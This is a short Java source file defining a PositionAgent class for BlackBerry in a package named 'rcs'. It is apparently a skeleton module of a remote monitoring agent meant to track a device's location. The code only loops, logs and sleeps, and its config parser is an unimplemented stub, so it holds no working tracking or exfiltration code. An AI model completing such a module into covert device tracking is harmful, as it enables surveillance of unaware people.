package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class PositionAgent extends Agent {
    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);

    public PositionAgent(int agentStatus) {
        super(AGENT_POSITION, agentStatus, true);
    }

    protected PositionAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        int loop = 0;

        for (;;) {
            debug.trace("loop:" + loop);
            ++loop;

            if (agentSleep(1000)) {
                debug.trace(loop + " clean stop");
                return;
            }
        }
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
